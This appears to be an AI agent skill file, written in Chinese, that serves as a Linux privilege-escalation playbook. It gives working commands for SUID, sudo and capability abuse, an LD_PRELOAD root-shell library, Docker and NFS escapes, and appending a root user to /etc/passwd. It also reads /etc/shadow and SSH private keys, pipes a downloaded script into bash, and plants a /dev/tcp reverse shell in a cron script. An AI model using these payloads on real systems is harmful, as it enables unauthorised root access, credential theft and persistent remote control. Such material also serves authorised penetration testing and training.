---
name: privilege-escalation-linux
description: Linux本地提权，覆盖信息收集→SUID→Sudo→Cron→内核Exploit→Capabilities→Docker逃逸→NFS→PATH劫持全流程
---

# Linux本地提权

## 1. 信息收集（拿到Shell后第一步）

```bash
# 一键信息收集
id; whoami; hostname; uname -a; cat /etc/*release; cat /proc/version
ip a; ifconfig; route -n; arp -a
ls -la /home; cat /etc/passwd; cat /etc/shadow 2>/dev/null
ps aux; netstat -tlnp; ss -tlnp
sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null
crontab -l; cat /etc/crontab; ls -la /etc/cron*
env; ls -la /tmp /dev/shm /var/tmp
```

### 自动化审计

```bash
# LinPEAS — 最全面
curl -L http://your-server/linpeas.sh | bash
./linpeas.sh -a

# linux-exploit-suggester — 内核漏洞建议
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl
```

## 2. SUID提权

```bash
# 查找SUID文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 排除系统文件, 找可疑的
find / -perm -4000 -type f ! -path '/usr/*' ! -path '/bin/*' ! -path '/sbin/*' 2>/dev/null
```

### 常见SUID利用 (参考GTFObins)

```bash
# find
find . -exec /bin/sh -p \; -quit

# bash (少见)
bash -p

# vim
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'

# less/more → 交互模式输入 !/bin/sh

# awk
awk 'BEGIN {system("/bin/sh")}'

# python/python3
python3 -c 'import os;os.execl("/bin/sh","sh","-p")'

# cp/mv (如果SUID)
cp /bin/sh /tmp/sh && chmod u+s /tmp/sh

# systemctl
TF=$(mktemp).service
echo '[Service] Type=oneshot; ExecStart=/bin/sh -c "cp /bin/sh /tmp/sh && chmod u+s /tmp/sh"; [Install] WantedBy=multi-user.target' > $TF
systemctl link $TF; systemctl enable --now $TF; /tmp/sh -p
```

## 3. Sudo提权

```bash
# 查看sudo权限
sudo -l

# 利用 (参考GTFObins):
# (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c '!/bin/sh'
# (ALL) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/sh \; -quit
# (ALL) NOPASSWD: /usr/bin/awk → sudo awk 'BEGIN {system("/bin/sh")}'
# (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'import os;os.system("/bin/sh")'

# LD_PRELOAD (如果 env_keep += LD_PRELOAD):
# 编译共享库:
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/sh");
}
EOF
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so <allowed_command>
```

## 4. Cron任务提权

```bash
# 检查Cron
crontab -l; cat /etc/crontab; ls -la /etc/cron*

# 找可写的cron脚本
find /etc/cron* -writable -type f 2>/dev/null

# 利用:
# 1. 写入反弹Shell到可写脚本
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /etc/cron.hourly/backup.sh
# 2. 通配符注入 (tar/*.sh等)
```

## 5. 内核Exploit

```bash
# 收集内核版本
uname -a; cat /proc/version; cat /etc/*release

# 搜索exploit
searchsploit linux kernel <version>
./linux-exploit-suggester.sh

# 常见内核Exploit (示例):
# DirtyCow (CVE-2016-5195) — 2.6.22 ~ 4.8.3
# DirtyPipe (CVE-2022-0847) — 5.8 ~ 5.16.11
# PwnKit (CVE-2021-4034) — polkit
# OverlayFS (CVE-2023-0386) — 5.11 ~ 6.2
```

## 6. Capabilities提权

```bash
# 查找capabilities
getcap -r / 2>/dev/null

# 利用:
# cap_setuid+ep: python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# cap_net_raw+ep: 可抓包 → 抓取明文密码
# cap_dac_read_search+ep: 可读取任意文件 (如/etc/shadow)
```

## 7. Docker逃逸

```bash
# 在Docker容器中
# 1. 特权模式 (--privileged)
fdisk -l  # 看到宿主机磁盘 → 挂载
mount /dev/sda1 /mnt
chroot /mnt /bin/bash

# 2. Docker Socket挂载
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run -it -v /:/mnt alpine chroot /mnt

# 3. cgroup逃逸 (CVE-2022-0492)
```

## 8. 其他提权路径

```bash
# NFS: 查看/etc/exports, 如有no_root_squash:
showmount -e <nfs-server>
mount -t nfs <nfs-server>:/share /mnt
# 在/mnt创建SUID bash, 在服务器上执行

# PATH劫持: 找可写的PATH目录
find / -writable -type d 2>/dev/null | grep -v '/proc\|/sys'

# Writable /etc/passwd:
echo 'hacker:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
# 或 openssl passwd -1 password

# 历史文件泄露:
cat ~/.bash_history; cat ~/.mysql_history
cat ~/.ssh/id_rsa; cat ~/.ssh/authorized_keys
```

## 9. 决策树

```
拿到Shell
├─ sudo -l → 有NOPASSWD命令 → GTFObins查找 → 提权
├─ find / -perm -4000 → 有SUID → GTFObins
├─ getcap -r / → 有cap_setuid → 提权
├─ ps aux → root进程 → 检查可写配置文件
├─ 内核版本 → searchsploit → 内核Exploit
├─ crontab -l → 可写cron脚本 → 写入反弹Shell
├─ id → docker组 → Docker逃逸
├─ /etc/exports → no_root_squash → NFS提权
└─ LinPEAS全面扫描 → 按提示逐一尝试
```

---

*参考: GTFObins + HackTricks Linux Privilege Escalation + 实战经验*
